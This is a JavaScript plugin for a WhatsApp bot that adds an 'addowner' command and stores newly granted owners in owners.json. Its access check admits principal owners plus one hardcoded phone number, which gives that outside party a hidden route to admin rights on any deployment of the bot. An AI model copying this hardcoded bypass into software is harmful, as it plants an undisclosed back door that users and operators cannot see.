import fs from 'fs'
import path from 'path'
import config from '../../config.js'

const OWNERS_FILE = path.resolve(process.cwd(), 'owners.json')

if (!global.principalOwnersSaved) {
    global.principalOwnersSaved = [...config.ownerNumber]
}
const principalOwners = global.principalOwnersSaved

if (fs.existsSync(OWNERS_FILE)) {
    try {
        const extraOwners = JSON.parse(fs.readFileSync(OWNERS_FILE, 'utf8'))
        extraOwners.forEach(num => {
            if (!config.ownerNumber.includes(num)) config.ownerNumber.push(num)
        })
    } catch (e) { console.error(e) }
}

const extraerNum = (jid = '') => (typeof jid === 'string' ? jid : '').split('@')[0].split(':')[0].replace(/\D/g, '')

const resolveTargetJid = (m, participants = [], text = '') => {
  if (m.mentionedJid?.[0]) return m.mentionedJid[0]
  if (m.quoted?.sender) return m.quoted.sender
  const textNum = text.replace(/\D/g, '')
  if (textNum) return `${textNum}@s.whatsapp.net`
  return null
}

const handler = async (m, { text, usedPrefix, command, participants }) => {
  const senderNum = extraerNum(m.sender)

  if (!principalOwners.includes(senderNum) && senderNum !== '5493772455367') {
      return m.reply('*⌬┤ 🚫 ├⌬ ACCESO DENEGADO.*\n> Solo los Creadores Principales del bot pueden dar privilegios de Owner a otros.')
  }

  const targetJid = resolveTargetJid(m, participants, text)
  if (!targetJid) return m.reply(`*⌬┤ ⚠️ ├⌬ USO CORRECTO*\n> *${usedPrefix + command}* @usuario o respondiendo a un mensaje.`)

  const newOwner = extraerNum(targetJid)

  if (config.ownerNumber.includes(newOwner)) {
    return m.reply('*⌬┤ ⚠️ · ESTE USUARIO YA ES OWNER.*')
  }

  config.ownerNumber.push(newOwner)

  let extraOwners = []
  if (fs.existsSync(OWNERS_FILE)) {
      extraOwners = JSON.parse(fs.readFileSync(OWNERS_FILE, 'utf8'))
  }
  extraOwners.push(newOwner)
  fs.writeFileSync(OWNERS_FILE, JSON.stringify(extraOwners, null, 2))

  m.reply(`*⌬┤ ✅ ├⌬ NUEVO SUB-OWNER AGREGADO*\n> El número *+${newOwner}* ha sido registrado en \`owners.json\` y ahora tiene privilegios administrativos.`)
}

handler.help = ['addowner @user']
handler.tags = ['owner']
handler.command = ['addowner', 'agregarowner', 'darowner']
handler.ownerOnly = true

export default handler